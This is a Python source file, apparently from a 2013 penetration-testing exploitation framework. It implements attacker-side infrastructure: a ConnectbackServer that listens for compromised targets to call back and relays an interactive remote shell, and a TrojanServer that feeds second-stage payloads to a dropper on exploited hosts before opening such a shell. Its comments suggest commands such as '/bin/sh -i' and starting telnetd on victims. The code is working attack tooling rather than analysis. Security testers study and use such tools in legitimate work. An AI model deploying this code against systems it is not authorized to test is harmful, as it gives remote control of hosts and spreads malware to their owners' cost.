# Copyright (c) 2013
# - Zachary Cutlip <uid000@gmail.com>
# - Tactical Network Solutions, LLC
#
# See LICENSE.txt for more details.
#
import signal
import socket
import sys
import os
import select
import traceback
import errno
from ..common.support import Logging

class ConnectbackServer(object):
    """
    A connect-back server class.

    This class provides a server that waits for an incoming connection from a
    connect-back payload and provides an interactive shell.  Think "netcat
    listener" that has an API and can be used programmatically.
    """

    MAX_READ=1024
    def __init__(self,connectback_ip,port=8080,startcmd=None,connectback_shell=True,
            logger=None,connected_event=None):
        """
        Class constructor.

        Parameters
        ----------
        connectback_ip: the address this server should bind to.
        port: Optional. The port this server should bind to.  Default value is
            8080.
        startcmd: Optional.  A command string to issue to the remote host upon
            connecting.  This could be a command to restart the exploited
            service, or to customize the interactive shell, e.g., '/bin/sh -i'.
        connectback_shell: Optional.  This argument defaults to True, which is
            99% of the time is what you need.  See note.
        logger: Optional.  A logger object is

        Note
        ----
        If, say, you wanted to non-interactively exploit a target (or multiple
        targets) and automatically kick off a telnet sever on each one, then,
        for each exploited target, you could construct a ConnectbackServer like
        so:
            server=ConnectbackServer(connectback_ip,startcmd='/sbin/telnetd',connectback_shell=False)
        """
        if logger:
            self.logger=logger
        else:
            self.logger=Logging()

        self.pid=None
        self.connectback_ip=connectback_ip
        self.port=port
        self.startcmd=startcmd
        self.connectback_shell=connectback_shell
        self.connected_event=connected_event

    def _handler(self,signum,frame):
        #print >>sys.stderr,"signal num %d\n"%signum
        self.keepgoing=False

    def _setup_signals(self):
        self.keepgoing=True
        signal.signal(signal.SIGINT,self._handler)
        signal.signal(signal.SIGTERM,self._handler)

    def _server(self):
        serversocket = socket.socket(
                socket.AF_INET,socket.SOCK_STREAM)
        serversocket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

        serversocket.bind((self.connectback_ip,int(self.port)))
        serversocket.listen(5)
        return serversocket

    def _exit(self):
        #this prevents a hang in mod_wsgi, which traps sys.exit()
        os.execv("/bin/true",["/bin/true"])

    def _serve_connectback_shell(self,serversocket):
        self._setup_signals()
        max_read=self.__class__.MAX_READ
        self.logger.LOG_INFO("Listening on port %d" % int(self.port))
        self.logger.LOG_INFO("Waiting for incoming connection.")
        self.keepgoing=True


        (clientsocket,addess) = serversocket.accept()

        self.logger.LOG_INFO("Target has phoned home.")
        if self.connected_event:
            # let the caller know they have a connection
            self.logger.LOG_INFO("asadfsa")
            self.connected_event.set()

        fd_to_file={clientsocket.fileno:clientsocket,sys.stdin.fileno():sys.stdin}
        inputlist=[clientsocket,sys.stdin]


        if None != self.startcmd:
            clientsocket.send(self.startcmd+"\n")
        #clientsocket.send("exec /bin/sh -i\n")

        if self.connectback_shell:
            self.keepgoing=True
        else:
            self.keepgoing=False

        while self.keepgoing==True:
            try:
                inp,outp,excep=select.select(inputlist,[],[])
                for f in inp:
                    if f is clientsocket:
                        data=f.recv(max_read)
                        if data:
                            sys.stdout.write(data)
                            sys.stdout.flush()
                    else:
                        data=sys.stdin.readline()
                        if data:
                            clientsocket.send(data)

            except Exception as e:
                #print traceback.format_exc()
                #print >>sys.stderr,str(e)
                self.keepgoing=False
                self.logger.LOG_INFO("Closing connection.")
                clientsocket.shutdown(socket.SHUT_RDWR)
                clientsocket.close()


    def wait(self):
        """
        Wait for server to shut down.  The server will shut down when
        the remote end has close the connection.
        """
        signal.signal(signal.SIGINT,self._handler)
        self.keep_going=True
        status=(0,0)
        while self.keep_going:
            try:
                status=os.waitpid(self.pid,0)
                self.keep_going=False
            except OSError as ose:
                if not ose.errno == errno.EINTR:
                    self.keep_going = False

        signal.signal(signal.SIGINT,signal.SIG_DFL)
        self.pid=None
        return status[1]

    def shutdown(self):
        """
        Shut down the server.

        This should only be necessary if the server has not yet received a
        connection (e.g., remote exploit failed)
        or when the remote end won't close the connection.

        In the event the server has received a connection, it should shutdown
        gracefully when the connection is closed at the remote end.
        """
        if not self.pid:
            return
        try:
            os.kill(self.pid,signal.SIGTERM)
        except Exception as e:
            self.logger.LOG_WARN("Error shutting down server: %s" % str(e))


    def serve(self):
        """
        Serve connect-back shell.

        This function forks and returns the child PID.  The child exits without
        returning.

        If connectback_shell is False and startcmd is None, this function
        returns None immediately without forking.

        """

        if self.connectback_shell or self.startcmd:
            if self.pid:
                raise Exception("There is an existing child process. Pid: %d" %self.pid)
            try:
                serversocket=self._server()
            except Exception as e:
                self.logger.LOG_WARN("There was an error creating server socket: %s" % str(e))
                return None
            self.pid=os.fork()
            if self.pid and self.pid > 0:
                serversocket.close()
                return self.pid
            else:
                try:
                    self._serve_connectback_shell(serversocket)
                except Exception as e:
                    self.logger.LOG_WARN("There was an error serving shell: %s" % str(e))

                serversocket.shutdown(socket.SHUT_RDWR)
                serversocket.close()
                self._exit()
        else:
            return None


class TrojanServer(ConnectbackServer):
    """
    A server that supports the TrojanDropper payload.

    This server will serve up each of a list of file provided to the constructor.
    At the end of the list, if connect_back_shell is True, it will serve a shell
    just like ConnectbackServer does.

    An ideal use case is to have the TrojanDropper download and execute a
    second stage payload, that in turn downloads another file (i.e. wget or nc)
    then pops a connect-back shell.

    See stage2dropper.c in contrib for an example.
    """
    def __init__(self,connectback_ip,files_to_serve,port=8080,startcmd=None,connectback_shell=False,logger=None):
        """
        Constructor.

        Parameters
        ----------
        connectback_ip: the address this server should bind to.
        files_to_serve: A list of files to serve up to the target.  One file is
                        served per client.
        port: Optional. The port this server should bind to.  Default value is
            8080.
        startcmd: Optional.  A command string to issue to the remote host upon
            connecting.  This could be a command to restart the exploited
            service, or to customize the interactive shell, e.g., '/bin/sh -i'.
        connectback_shell: Optional.  This argument defaults to True, which is
            99% of the time is what you need.  See note.
        logger: Optional.  A logger object is

        """
        super(self.__class__,self).__init__(connectback_ip,port=port,startcmd=startcmd,
                                                connectback_shell=connectback_shell,logger=logger)
        self.files_to_serve=files_to_serve
        self.connectback_shell=connectback_shell


    def _serve_file_to_client(self,filename,serversocket):
        data=open(filename,"r").read();
        (clientsocket,address) = serversocket.accept()
        clientsocket.send(data)

        clientsocket.shutdown(socket.SHUT_RDWR)
        clientsocket.close()


    def serve(self):
        """
        Serve a list of one or more files to the target, and optionally serve a
        connect-back shell.

        This function forks and returns the child PID.  The child exits without
        returning.
        """
        try:
            serversocket=self._server()
        except Exception as e:
            self.logger.LOG_WARN("There was an error creating server socket: %s" % str(e))
            return None

        self.pid=os.fork()
        if self.pid:
            return self.pid
        else:
            for _file in self.files_to_serve:
                self.logger.LOG_INFO("Waiting to send file: %s ..." % _file)
                self._serve_file_to_client(_file,serversocket)
                self.logger.LOG_INFO("Done with file: %s."% _file)



            if self.connectback_shell == True:
                self.logger.LOG_INFO("Serving connectback_shell.")
                self._serve_connectback_shell(serversocket)

            serversocket.shutdown(socket.SHUT_RDWR)
            serversocket.close()
            self._exit()



